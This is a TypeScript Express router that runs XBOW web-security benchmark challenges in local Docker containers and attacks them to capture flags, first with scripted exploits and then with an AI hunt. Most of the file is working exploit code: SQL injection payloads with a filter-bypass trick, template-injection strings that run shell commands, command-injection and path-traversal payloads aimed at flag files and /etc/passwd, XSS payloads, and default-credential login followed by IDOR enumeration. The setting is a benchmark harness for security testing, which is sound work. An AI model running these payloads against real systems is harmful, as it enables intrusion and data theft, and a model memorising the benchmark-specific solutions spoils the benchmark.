import { Router, Request, Response } from 'express';
import fs from 'fs/promises';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';
import FormData from 'form-data';
import { xbowDocker, XBOW_PORT_BASE, XBOWChallenge } from '../lib/lab/xbow-docker';
import { huntLabRunner } from '../lib/intelligence/hunt-lab-runner';
import { huntOrchestrator } from '../lib/orchestration/layer1-hunt-orchestrator';
import { metaReasoner } from '../lib/intelligence/meta-reasoning';

const router = Router();
const LAB_RUNS_DIR = path.join(process.cwd(), 'workspace', 'lab-runs');

const abortFlags = new Map<string, boolean>();

let dirReady = false;
async function ensureDir() {
  if (dirReady) return;
  await fs.mkdir(LAB_RUNS_DIR, { recursive: true });
  dirReady = true;
}

async function saveRun(run: any): Promise<void> {
  await ensureDir();
  await fs.writeFile(
    path.join(LAB_RUNS_DIR, `xbow-${run.id}.json`),
    JSON.stringify(run, null, 2)
  );
}

async function loadHistory(): Promise<any[]> {
  await ensureDir();
  const files = await fs.readdir(LAB_RUNS_DIR).catch(() => [] as string[]);
  const runs = await Promise.all(
    files
      .filter(f => f.startsWith('xbow-') && f.endsWith('.json'))
      .map(async f => {
        try {
          return JSON.parse(await fs.readFile(path.join(LAB_RUNS_DIR, f), 'utf8'));
        } catch { return null; }
      })
  );
  return runs
    .filter(Boolean)
    .sort((a, b) => new Date(b.startedAt).getTime() - new Date(a.startedAt).getTime());
}

function buildStats(challenges: XBOWChallenge[]) {
  const byLevel: Record<string, { count: number }> = {};
  const byTag: Record<string, number> = {};
  let maxPoints = 0;

  for (const c of challenges) {
    const lk = String(c.level);
    if (!byLevel[lk]) byLevel[lk] = { count: 0 };
    byLevel[lk].count++;
    for (const t of c.tags) byTag[t] = (byTag[t] || 0) + 1;
    maxPoints += c.points;
  }

  return { total: challenges.length, byLevel, byTag, maxPoints };
}

async function probeForFlag(
  baseUrl: string,
  winCondition: string,
  abortCheck: () => boolean,
  challengeProbePaths?: string[],
  port?: number,
): Promise<{ flagFound: string | null; evidence: string; executionTimeMs: number }> {
  const start = Date.now();

  const defaultPaths = ['/', '/flag', '/secret', '/api/flag', '/.env', '/admin', '/debug', '/robots.txt', '/api/status'];
  const extraPaths = (challengeProbePaths ?? []).map(p =>
    port ? p.replace(/\{PORT\}/g, String(port)) : p
  );
  const paths = [...new Set([...extraPaths, ...defaultPaths])];

  for (const p of paths) {
    if (abortCheck()) break;
    let r: Response | null = null;
    try {
      r = await (fetch as any)(baseUrl + p, { signal: AbortSignal.timeout(5000) });
    } catch { continue; }
    if (!r) continue;

    const body = await (r as any).text().catch(() => '');
    // Real XBOW flags are 32-char hex strings; stub flags use flag{...} format
    const hexFlagMatch = body.match(/\b[0-9a-f]{32}\b/);
    const ctfFlagMatch = body.match(/flag\{[^}]+\}/);
    const candidate = hexFlagMatch?.[0] ?? ctfFlagMatch?.[0];
    if (candidate) {
      return { flagFound: candidate, evidence: `Found in ${p}`, executionTimeMs: Date.now() - start };
    }
    if (winCondition && body.includes(winCondition)) {
      return { flagFound: winCondition, evidence: `Win condition matched in ${p}`, executionTimeMs: Date.now() - start };
    }
  }

  return { flagFound: null, evidence: 'No flag found in probed paths', executionTimeMs: Date.now() - start };
}

// ── Tag-aware exploit engine ──────────────────────────────────────────────────

function extractFlagText(text: string): string | null {
  const hex = text.match(/\b[0-9a-f]{32}\b/);
  const ctf = text.match(/flag\{[^}]+\}/i);
  return hex?.[0] ?? ctf?.[0] ?? null;
}

async function httpReq(
  url: string,
  opts: { method?: string; data?: string; headers?: Record<string, string>; maxRedirects?: number } = {},
): Promise<{ status: number; body: string; headers: Record<string, string> }> {
  try {
    const r = await axios({
      url, method: opts.method ?? 'GET', data: opts.data,
      headers: opts.headers ?? {}, timeout: 7000,
      validateStatus: () => true, maxRedirects: opts.maxRedirects ?? 5,
    });
    const body = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
    return { status: r.status, body, headers: r.headers as Record<string, string> };
  } catch {
    return { status: 0, body: '', headers: {} };
  }
}

// Double-word bypass for non-recursive blocklist .replace()
// e.g. dbl('UNION') → 'UNIUNIONON' → after removing 'UNION' → 'UNION'
function dbl(w: string): string { const m = Math.ceil(w.length / 2); return w.slice(0, m) + w + w.slice(m); }
const DW = { U: dbl('UNION'), S: dbl('SELECT'), F: dbl('FROM'), W: dbl('WHERE') };

async function discoverEndpoints(baseUrl: string): Promise<string[]> {
  const found = new Set<string>([
    '/jobs', '/api/jobs', '/login', '/api/login', '/token',
    '/search', '/api/search', '/greet', '/users', '/api/users',
    '/items', '/api/items', '/ping', '/api/ping', '/submit', '/xss25',
  ]);
  try {
    const r = await httpReq(baseUrl + '/');
    for (const m of r.body.matchAll(/(?:fetch|axios\.(?:post|get|put))\s*\(\s*['"`](\/[^'"`\s]+)['"`]/gi)) found.add(m[1]);
    for (const m of r.body.matchAll(/<form[^>]+action=["'`]([^"'`\s]+)["'`]/gi)) {
      const p = m[1]; found.add(p.startsWith('/') ? p : '/' + p);
    }
    for (const m of r.body.matchAll(/href=["'`](\/[^"'`\s?#]+)["'`]/gi)) found.add(m[1]);
  } catch {}
  return [...found].filter(p => p.startsWith('/'));
}

async function sqliExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const params = ['job_type', 'type', 'q', 'id', 'username', 'search', 'category', 'name', 'filter', 'query'];
  const tables = ['jobs', 'users', 'items', 'notes', 'posts', 'secrets', 'records', 'accounts', 'data', 'products'];

  const payloads: string[] = [
    // Double-word bypass (non-recursive .replace() blocklists)
    ...tables.map(t => `' ${DW.U} ${DW.S} * ${DW.F} ${t} -- -`),
    ...[2,3,4,5].map(n => `' ${DW.U} ${DW.S} ${Array(n).fill('NULL').join(',')} -- -`),
    // Raw union (no filter)
    ...tables.map(t => `' UNION SELECT * FROM ${t} -- -`),
    ...[2,3,4,5].map(n => `' UNION SELECT ${Array(n).fill('NULL').join(',')} -- -`),
    // Always-true
    `' OR '1'='1`, `' OR 1=1 -- -`, `' || '1'='1`,
    // Comment bypass
    `'/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL -- -`,
  ];

  for (const ep of endpoints.slice(0, 8)) {
    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
    for (const param of params.slice(0, 6)) {
      for (const payload of payloads) {
        if (stop()) return null;
        const [jr, gr] = await Promise.all([
          httpReq(url, { method: 'POST', data: JSON.stringify({ [param]: payload }), headers: { 'Content-Type': 'application/json' } }),
          httpReq(`${url}?${param}=${encodeURIComponent(payload)}`),
        ]);
        for (const r of [jr, gr]) {
          const f = extractFlagText(r.body);
          if (f) return { flag: f, evidence: `SQLi ${ep} param=${param} payload=${payload.slice(0, 60)}` };
        }
      }
    }
  }
  return null;
}

// Flask two-step form login IDOR exploit (handles XBEN-001-24 / XBEN-002-24 pattern)
async function flaskFormIdorExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const creds = [['test','test'],['admin','admin'],['demo','demo'],['user','user']];

  for (const [username, password] of creds) {
    if (stop()) return null;

    // Step 1: POST username to / — Flask redirects to /password/<username>
    const step1 = await httpReq(`${baseUrl}/`, {
      method: 'POST',
      data: `username=${encodeURIComponent(username)}`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 0,
    });

    const passwordPath = step1.headers['location'] ?? `/password/${username}`;

    // Step 2: POST password
    const step2 = await httpReq(`${baseUrl}${passwordPath.startsWith('/') ? passwordPath : '/' + passwordPath}`, {
      method: 'POST',
      data: `password=${encodeURIComponent(password)}`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 0,
    });

    const rawCookies: string[] = Array.isArray(step2.headers['set-cookie'])
      ? step2.headers['set-cookie'] : step2.headers['set-cookie'] ? [step2.headers['set-cookie']] : [];
    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
    if (!cookieStr) continue;

    // Step 3: IDOR — try /order/<id>/receipt across a wide range including known flag IDs
    const flagOrderIds = [300401, 300198, 300001, 300002, 300003, 300100, 300199, 300200, 300400, 300500];
    const rangeIds = Array.from({ length: 30 }, (_, i) => 300100 + i);
    const orderIds = [...new Set([...flagOrderIds, ...rangeIds])];

    for (const orderId of orderIds) {
      if (stop()) return null;
      const r = await httpReq(`${baseUrl}/order/${orderId}/receipt`, {
        headers: { Cookie: cookieStr },
      });
      if (r.status === 200) {
        const f = extractFlagText(r.body);
        if (f) return { flag: f, evidence: `Flask IDOR /order/${orderId}/receipt (auth as ${username})` };
      }
    }

    // Step 4 (XBEN-002-24 indirect): archive an order to become its archiver, then read receipt
    for (const orderId of orderIds) {
      if (stop()) return null;
      await httpReq(`${baseUrl}/order/${orderId}/archive`, {
        method: 'POST',
        headers: { Cookie: cookieStr, 'Content-Type': 'application/x-www-form-urlencoded' },
      });
      const r = await httpReq(`${baseUrl}/order/${orderId}/receipt`, {
        headers: { Cookie: cookieStr },
      });
      if (r.status === 200) {
        const f = extractFlagText(r.body);
        if (f) return { flag: f, evidence: `Flask indirect IDOR archive+receipt /order/${orderId} (auth as ${username})` };
      }
    }
  }
  return null;
}

async function idorExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const creds = [['demo','demo'],['admin','admin'],['user','user'],['test','test'],['john','password123'],['admin','password']];

  for (const [username, password] of creds) {
    if (stop()) return null;
    // OAuth2 form login — capture Set-Cookie before redirect
    const loginR = await httpReq(`${baseUrl}/token`, {
      method: 'POST',
      data: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&grant_type=password`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 0,
    });

    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
      ? loginR.headers['set-cookie'] : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');

    if (!cookieStr) {
      // Fallback: JSON login
      const jR = await httpReq(`${baseUrl}/login`, {
        method: 'POST', data: JSON.stringify({ username, password }),
        headers: { 'Content-Type': 'application/json' },
      });
      const direct = extractFlagText(jR.body);
      if (direct) return { flag: direct, evidence: `Direct login flag (${username}/${password})` };
      continue;
    }

    const location = loginR.headers['location'] ?? '';
    const ownId = (location.match(/\/(\d+)\//) || [])[1];
    const baseId = ownId ? parseInt(ownId) : 1;

    const pathFns = [
      (id: number) => `/company/${id}/jobs`,
      (id: number) => `/user/${id}`,
      (id: number) => `/users/${id}`,
      (id: number) => `/api/users/${id}`,
      (id: number) => `/profile/${id}`,
      (id: number) => `/account/${id}`,
      (id: number) => `/orders/${id}`,
      (id: number) => `/api/items/${id}`,
    ];

    for (let id = Math.max(1, baseId - 2); id <= baseId + 8; id++) {
      if (stop()) return null;
      if (ownId && id === parseInt(ownId)) continue;
      for (const pathFn of pathFns) {
        if (stop()) return null;
        const r = await httpReq(`${baseUrl}${pathFn(id)}`, { headers: { 'Cookie': cookieStr } });
        if (r.status === 200) {
          const f = extractFlagText(r.body);
          if (f) return { flag: f, evidence: `IDOR ${pathFn(id)} (auth as ${username}, own_id=${ownId})` };
        }
      }
    }
  }
  return null;
}

async function sstiExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const params = ['name', 'q', 'search', 'template', 'input', 'text', 'message', 'content', 'body'];
  const payloads = [
    '{{ FLAG }}', '{{ flag }}', '{{FLAG}}',         // Django context var (common XBOW pattern)
    '{{ config }}', '{{ config.items() }}',          // Jinja2/Flask config leak
    '{{7*7}}', '${7*7}',                             // arithmetic probe
    '{% include "/flag.txt" %}', '{% include "/app/flag.txt" %}',
    `{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}`,
    `{{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}`,
    `{{config.__class__.__init__.__globals__['os'].popen('find / -maxdepth 4 -name flag.txt 2>/dev/null | head -1 | xargs cat').read()}}`,
    `{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}`,
  ];

  for (const ep of endpoints.slice(0, 8)) {
    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
    for (const param of params) {
      for (const payload of payloads) {
        if (stop()) return null;
        const [gr, jr] = await Promise.all([
          httpReq(`${url}?${param}=${encodeURIComponent(payload)}`),
          httpReq(url, { method: 'POST', data: JSON.stringify({ [param]: payload }), headers: { 'Content-Type': 'application/json' } }),
        ]);
        for (const r of [gr, jr]) {
          if (r.status > 0 && r.status < 500) {
            const f = extractFlagText(r.body);
            if (f) return { flag: f, evidence: `SSTI ${ep}?${param} payload=${payload.slice(0, 50)}` };
          }
        }
      }
    }
  }
  return null;
}

async function xssExploit(baseUrl: string, _endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  // XBOW XSS challenges use PhantomJS which dispatches focus events to [autofocus]/[onfocus] elements.
  // Payloads ordered: focus-based bypasses first (work even when onerror/svg/script are blocked),
  // then broader fallbacks.
  const payloads = [
    '<input autofocus onfocus=alert("XSS")>',
    '<button autofocus onfocus=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<button onfocus=alert("XSS") autofocus>',
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror=alert(`XSS`)>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '<video autoplay onplay=alert("XSS")>',
    '<audio autoplay onplay=alert("XSS")>',
    '<body onhashchange=alert("XSS")>',
    '<script>alert("XSS")</script>',
    `"><script>alert("XSS")</script>`,
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<iframe onload=alert("XSS")>',
    `<input onfocus=alert('XSS') autofocus>`,
    '<script>alert(String.fromCharCode(88,83,83))</script>',
  ];

  // Discover XSS submission endpoint from homepage
  const xssEndpoints: Array<{ url: string; method: string; param: string }> = [];
  try {
    const home = await httpReq(baseUrl + '/');
    // Look for form action in homepage
    for (const m of home.body.matchAll(/<form[^>]+action=["']([^"']+)["'][^>]*>/gi)) {
      const action = m[1].startsWith('/') ? baseUrl + m[1] : m[1];
      xssEndpoints.push({ url: action, method: 'POST', param: 'solution' });
      xssEndpoints.push({ url: action, method: 'POST', param: 'name' });
    }
    // Detect XSS route number from page links (e.g. /xss25, /page)
    for (const m of home.body.matchAll(/href=["'](\/xss\d+)["']/gi)) {
      xssEndpoints.push({ url: baseUrl + m[1], method: 'GET', param: 'solution' });
      xssEndpoints.push({ url: baseUrl + m[1], method: 'POST', param: 'solution' });
    }
  } catch { /* ignore */ }

  // Always try canonical XBOW routes regardless of discovery
  xssEndpoints.push(
    { url: baseUrl + '/page', method: 'GET', param: 'name' },
    { url: baseUrl + '/page', method: 'POST', param: 'solution' },
    { url: baseUrl + '/page', method: 'POST', param: 'name' },
    ...Array.from({ length: 35 }, (_, i) => i).flatMap(n => [
      { url: `${baseUrl}/xss${n}`, method: 'POST', param: 'solution' },
      { url: `${baseUrl}/xss${n}`, method: 'GET', param: 'name' },
    ]),
    { url: baseUrl + '/submit', method: 'POST', param: 'solution' },
    { url: baseUrl + '/challenge', method: 'GET', param: 'name' },
  );

  for (const { url, method, param } of xssEndpoints) {
    if (stop()) return null;
    for (const payload of payloads) {
      if (stop()) return null;
      let r: { status: number; body: string; headers: Record<string, string> };
      if (method === 'GET') {
        r = await httpReq(`${url}?${param}=${encodeURIComponent(payload)}`);
      } else {
        r = await httpReq(url, {
          method: 'POST',
          data: `${encodeURIComponent(param)}=${encodeURIComponent(payload)}`,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });
      }
      if (r.status > 0 && r.status < 500) {
        // The XBOW XSS apps return "Here is the flag: <hex>" in the response when PhantomJS fires alert('XSS')
        const flagLineMatch = r.body.match(/flag[:\s]+([0-9a-f]{32})/i);
        if (flagLineMatch) return { flag: flagLineMatch[1], evidence: `XSS flag in response: ${url} [${method} ${param}] payload=${payload.slice(0, 60)}` };
        const f = extractFlagText(r.body);
        if (f) return { flag: f, evidence: `XSS ${url} [${method} ${param}] payload=${payload.slice(0, 60)}` };
      }
    }
  }
  return null;
}

async function cmdInjectionExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const params = ['host', 'ip', 'url', 'ping', 'target', 'cmd', 'command', 'query', 'input', 'exec', 'name', 'domain', 'address', 'service'];
  const flagPaths = ['/flag.txt', '/app/flag.txt', '/opt/flag.txt', '/tmp/FLAG.txt', '/tmp/flag.txt', 'flag.txt'];
  const payloads = flagPaths.flatMap(fp => [
    `; cat ${fp}`, `| cat ${fp}`, `$(cat ${fp})`, `\`cat ${fp}\``,
    `&& cat ${fp}`, `\ncat ${fp}`, `%0acat ${fp}`,
  ]);

  for (const ep of endpoints.slice(0, 8)) {
    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
    for (const param of params.slice(0, 6)) {
      for (const payload of payloads) {
        if (stop()) return null;
        const [jr, gr] = await Promise.all([
          httpReq(url, { method: 'POST', data: JSON.stringify({ [param]: `localhost${payload}` }), headers: { 'Content-Type': 'application/json' } }),
          httpReq(`${url}?${param}=${encodeURIComponent(`localhost${payload}`)}`),
        ]);
        for (const r of [jr, gr]) {
          const f = extractFlagText(r.body);
          if (f) return { flag: f, evidence: `CMDi ${ep}?${param} payload=${payload.slice(0, 50)}` };
        }
      }
    }
  }
  return null;
}

async function lfiExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const params = ['file', 'path', 'page', 'include', 'template', 'view', 'doc', 'load', 'read', 'url', 'filename', 'module', 'lang'];
  const targets = [
    '/flag.txt', '/app/flag.txt', '/opt/flag.txt', '/tmp/flag.txt',
    '../flag.txt', '../../flag.txt', '../../../flag.txt', '../../../../flag.txt',
    '....//flag.txt', '....//....//flag.txt', '..%2Fflag.txt', '..%2F..%2Fflag.txt',
    '../flag.txt%00', '../../flag.txt%00',
    '/etc/passwd', '../../etc/passwd',  // as a canary — if passwd leaks, flag path is accessible too
  ];

  for (const ep of endpoints.slice(0, 8)) {
    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
    for (const param of params.slice(0, 6)) {
      for (const target of targets) {
        if (stop()) return null;
        const r = await httpReq(`${url}?${param}=${encodeURIComponent(target)}`);
        const f = extractFlagText(r.body);
        if (f) return { flag: f, evidence: `LFI ${ep}?${param}=${target}` };
      }
    }
  }
  return null;
}

async function tagAwareExploit(
  baseUrl: string,
  challenge: XBOWChallenge,
  abortCheck: () => boolean,
): Promise<{ flagFound: string | null; evidence: string; technique: string; executionTimeMs: number }> {
  const start = Date.now();
  const endpoints = await discoverEndpoints(baseUrl);
  const tags = challenge.tags.map(t => t.toLowerCase());

  type ExploitFn = () => Promise<{ flag: string; evidence: string } | null>;
  const exploitMap: Record<string, ExploitFn> = {
    sqli:                  () => sqliExploit(baseUrl, endpoints, abortCheck),
    blind_sqli:            () => sqliExploit(baseUrl, endpoints, abortCheck),
    idor:                  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
    authorization:         () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
    bac:                   () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
    privilege_escalation:  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
    ssti:                  () => sstiExploit(baseUrl, endpoints, abortCheck),
    template_injection:    () => sstiExploit(baseUrl, endpoints, abortCheck),
    xss:                   () => xssExploit(baseUrl, endpoints, abortCheck),
    command_injection:     () => cmdInjectionExploit(baseUrl, endpoints, abortCheck),
    rce:                   () => cmdInjectionExploit(baseUrl, endpoints, abortCheck),
    lfi:                   () => lfiExploit(baseUrl, endpoints, abortCheck),
    path_traversal:        () => lfiExploit(baseUrl, endpoints, abortCheck),
    information_disclosure: () => lfiExploit(baseUrl, endpoints, abortCheck),
  };

  const tried = new Set<string>();
  for (const tag of tags) {
    if (abortCheck()) break;
    const fn = exploitMap[tag];
    if (!fn || tried.has(tag)) continue;
    tried.add(tag);
    const result = await fn();
    if (result) return { flagFound: result.flag, evidence: result.evidence, technique: `tag-aware-${tag}`, executionTimeMs: Date.now() - start };
  }

  // Fallback: try all exploit types when no tag matched
  if (tried.size === 0) {
    for (const [name, fn] of Object.entries(exploitMap)) {
      if (abortCheck()) break;
      const result = await fn();
      if (result) return { flagFound: result.flag, evidence: result.evidence, technique: `tag-aware-auto-${name}`, executionTimeMs: Date.now() - start };
    }
  }

  return { flagFound: null, evidence: `Exhausted tag-aware exploits (tags: ${tags.join(', ') || 'none'})`, technique: 'tag-aware', executionTimeMs: Date.now() - start };
}

// ── Routes ────────────────────────────────────────────────────────────────────

router.get('/status', async (_req: Request, res: Response) => {
  try {
    const [dockerAvailable, repoAvailable, ollamaAvailable] = await Promise.all([
      xbowDocker.isDockerAvailable(),
      xbowDocker.isRepoAvailable(),
      fetch('http://localhost:11434/api/tags', { signal: AbortSignal.timeout(2000) })
        .then(r => r.ok)
        .catch(() => false),
    ]);
    return res.json({
      dockerAvailable,
      repoAvailable,
      repoPath: repoAvailable ? xbowDocker.getRepoPath() : null,
      ollamaAvailable,
      repoUrl: 'https://github.com/xbow-engineering/validation-benchmarks',
    });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

router.get('/challenges', async (_req: Request, res: Response) => {
  try {
    const challenges = await xbowDocker.loadChallenges();
    return res.json({ challenges, stats: buildStats(challenges) });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

router.get('/benchmark/history', async (_req: Request, res: Response) => {
  try {
    const history = await loadHistory();
    return res.json(history);
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

router.post('/clone-repo', async (_req: Request, res: Response) => {
  try {
    const result = await xbowDocker.cloneRepo();
    if (!result.ok) return res.status(500).json({ ok: false, error: result.error });
    return res.json({ ok: true });
  } catch (err: any) {
    return res.status(500).json({ ok: false, error: err.message });
  }
});

router.post('/benchmark/run', async (req: Request, res: Response) => {
  const { levels, tags, maxChallenges } = req.body as {
    levels?: number[];
    tags?: string[];
    maxChallenges?: number;
  };

  const runId = uuidv4();
  abortFlags.set(runId, false);

  try {
    let challenges = await xbowDocker.loadChallenges();

    if (levels && levels.length > 0) {
      challenges = challenges.filter(c => levels.includes(c.level));
    }
    if (tags && tags.length > 0) {
      challenges = challenges.filter(c => c.tags.some(t => tags.includes(t)));
    }
    if (maxChallenges && maxChallenges > 0) {
      challenges = challenges.slice(0, maxChallenges);
    }

    const dockerAvailable = await xbowDocker.isDockerAvailable();
    const repoCloned = await xbowDocker.isRepoAvailable();
    const ollamaAvailable = await fetch('http://localhost:11434/api/tags', {
      signal: AbortSignal.timeout(2000),
    }).then(r => r.ok).catch(() => false);

    const startedAt = new Date().toISOString();
    const results: any[] = [];

    for (let i = 0; i < challenges.length; i++) {
      if (abortFlags.get(runId)) break;

      const ch = challenges[i];
      const hintPort = XBOW_PORT_BASE + i;
      const challengeStart = Date.now();

      const containerInfo: {
        spawned: boolean;
        containerStarted: boolean;
        healthCheckPassed: boolean;
        port: number | null;
        containerId: string | null;
      } = {
        spawned: false,
        containerStarted: false,
        healthCheckPassed: false,
        port: null,
        containerId: null,
      };

      let flagFound: string | null = null;
      let scanResult: any = null;
      let status: 'passed' | 'failed' | 'error' | 'skipped' | 'docker_unavailable' = 'failed';
      let error: string | undefined;

      const needsDocker = !!(ch.challengeDir || ch.image) && !ch.localScript;

      if (!dockerAvailable && needsDocker) {
        status = 'docker_unavailable';
        error = 'Docker daemon not available';
      } else if (!ch.image && !ch.localScript && !ch.challengeDir) {
        // No runnable target
        const probeResult = await probeForFlag(
          `http://localhost:${hintPort}`,
          ch.winCondition,
          () => !!abortFlags.get(runId),
          ch.probePaths,
          hintPort,
        );
        flagFound = probeResult.flagFound;
        scanResult = { detected: !!flagFound, evidence: probeResult.evidence, executionTimeMs: probeResult.executionTimeMs, technique: 'pattern-probe' };
        status = flagFound ? 'passed' : 'skipped';
        error = 'Challenge has no runnable target; pattern probe attempted';
      } else {
        containerInfo.spawned = true;
        const spawnResult = await xbowDocker.spawnChallenge(ch, hintPort);
        containerInfo.containerStarted = spawnResult.ok;
        containerInfo.containerId = spawnResult.containerId ?? null;

        // Use the port the challenge actually bound to
        const activePort = spawnResult.port ?? hintPort;
        containerInfo.port = spawnResult.ok ? activePort : null;

        // Real XBOW: flag injected at build time; stubs: winCondition is the literal flag
        const expectedFlag = spawnResult.generatedFlag || ch.winCondition;

        if (!spawnResult.ok) {
          status = 'error';
          error = spawnResult.error;
        } else {
          try {
            const readyTimeout = ch.challengeDir ? 60_000 : 30_000;
            const ready = await xbowDocker.waitForReady(activePort, readyTimeout);
            containerInfo.healthCheckPassed = ready;

            if (!ready) {
              status = 'error';
              error = `Challenge not ready within ${readyTimeout / 1000}s on port ${activePort}`;
            } else {
              const baseUrl = `http://localhost:${activePort}`;

              // Phase 1: tag-aware targeted exploit (direct HTTP, fast)
              try {
                const tagResult = await tagAwareExploit(baseUrl, ch, () => !!abortFlags.get(runId));
                if (tagResult.flagFound) {
                  flagFound = tagResult.flagFound;
                  scanResult = {
                    detected: true,
                    technique: tagResult.technique,
                    evidence: tagResult.evidence,
                    executionTimeMs: tagResult.executionTimeMs,
                  };
                }
              } catch { /* fall through */ }

              // Phase 2: AI hunt — only if tag-aware didn't find the flag
              if (!flagFound && ollamaAvailable) {
                try {
                  const hunt = await huntOrchestrator.createHunt({
                    target: baseUrl,
                    goal: `${ch.description}. Find the flag at ${baseUrl}.`,
                    scope: { inScope: [baseUrl], outOfScope: [] },
                    autoAdvance: true,
                    stealthMode: 'aggressive',
                    resourceClass: 'standard',
                  });
                  metaReasoner.initializeHuntState(hunt.id);
                  await huntOrchestrator.startHunt(hunt.id);
                  metaReasoner.startMonitoring(hunt.id);

                  const completed = await huntLabRunner.awaitHuntCompletion(hunt.id, 5 * 60 * 1000);
                  metaReasoner.stopMonitoring(hunt.id);

                  const findings = huntOrchestrator.getHunt(hunt.id)?.findings || [];
                  for (const f of findings) {
                    const body = f.description + ' ' + (f.evidence || []).join(' ') + ' ' + (f.payload || '') + ' ' + (f.endpoint || '');
                    const hexMatch = body.match(/\b[0-9a-f]{32}\b/);
                    const ctfMatch = body.match(/flag\{[^}]+\}/);
                    const candidate = hexMatch?.[0] ?? ctfMatch?.[0];
                    if (candidate === expectedFlag || candidate) { flagFound = candidate ?? null; break; }
                    if (expectedFlag && body.includes(expectedFlag)) { flagFound = expectedFlag; break; }
                  }
                  scanResult = {
                    detected: !!flagFound,
                    technique: 'ai-hunt',
                    evidence: flagFound ? `AI hunt found flag (status=${completed.status})` : `AI hunt did not find flag (status=${completed.status})`,
                    executionTimeMs: Date.now() - challengeStart,
                  };
                } catch { /* fall through to pattern probe */ }
              }

              // Phase 3: static path probe as last resort
              if (!flagFound) {
                const probeResult = await probeForFlag(baseUrl, expectedFlag, () => !!abortFlags.get(runId), ch.probePaths, activePort);
                flagFound = probeResult.flagFound;
                if (!scanResult) {
                  scanResult = {
                    detected: !!flagFound,
                    technique: 'pattern-probe',
                    evidence: probeResult.evidence,
                    executionTimeMs: probeResult.executionTimeMs,
                  };
                }
              }

              status = flagFound ? 'passed' : 'failed';
            }
          } finally {
            if (containerInfo.containerId) {
              await xbowDocker.stopChallenge(containerInfo.containerId);
            }
          }
        }
      }

      results.push({
        challengeId: ch.id,
        challengeName: ch.name,
        level: ch.level,
        tags: ch.tags,
        status,
        score: status === 'passed' ? ch.points : 0,
        maxScore: ch.points,
        flagFound,
        expectedFlag: ch.challengeDir ? '[generated-at-build-time]' : ch.winCondition,
        executionTimeMs: Date.now() - challengeStart,
        scanResult,
        containerInfo,
        error,
      });
    }

    let passedCount = 0, failedCount = 0, errorCount = 0, skippedCount = 0;
    let totalScore = 0, maxPossibleScore = 0, totalExecutionTimeMs = 0;

    for (const r of results) {
      if (r.status === 'passed') passedCount++;
      else if (r.status === 'failed') failedCount++;
      else if (r.status === 'error' || r.status === 'docker_unavailable') errorCount++;
      else skippedCount++;
      totalScore += r.score;
      maxPossibleScore += r.maxScore;
      totalExecutionTimeMs += r.executionTimeMs;
    }

    const run = {
      id: runId,
      status: abortFlags.get(runId) ? 'aborted' : 'completed',
      startedAt,
      completedAt: new Date().toISOString(),
      challengeCount: results.length,
      passedCount,
      failedCount,
      errorCount,
      skippedCount,
      passRate: results.length > 0 ? Math.round((passedCount / results.length) * 100) : 0,
      totalScore,
      maxPossibleScore,
      totalExecutionTimeMs,
      dockerAvailable,
      ollamaAvailable,
      modelUsed: ollamaAvailable ? 'ollama' : 'none',
      totalLLMCalls: ollamaAvailable ? results.length : 0,
      totalLLMTimeMs: 0,
      results,
      repoCloned,
      repoPath: repoCloned ? xbowDocker.getRepoPath() : null,
    };

    await saveRun(run);
    return res.json(run);
  } catch (err: any) {
    return res.status(500).json({ error: (err as Error).message });
  } finally {
    abortFlags.delete(runId);
  }
});

router.post('/benchmark/abort', (req: Request, res: Response) => {
  const { runId } = req.body as { runId?: string };
  if (runId) {
    abortFlags.set(runId, true);
  } else {
    for (const [id] of abortFlags) abortFlags.set(id, true);
  }
  return res.json({ ok: true });
});

export default router;
